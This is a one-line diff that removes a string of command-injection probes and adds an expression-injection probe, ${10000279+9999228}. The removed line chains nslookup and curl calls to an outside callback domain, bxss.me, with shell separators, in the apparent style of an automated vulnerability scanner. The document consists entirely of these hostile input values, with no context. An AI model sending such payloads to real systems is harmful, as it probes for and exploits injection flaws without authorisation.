@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitnskppmafnyc4ee9.bxss.me||curl hitnskppmafnyc4ee9.bxss.me)|(nslookup -q=cname hitnskppmafnyc4ee9.bxss.me||curl hitnskppmafnyc4ee9.bxss.me)&(nslookup -q=cname hitnskppmafnyc4ee9.bxss.me||curl hitnskppmafnyc4ee9.bxss.me)
+${10000279+9999228}
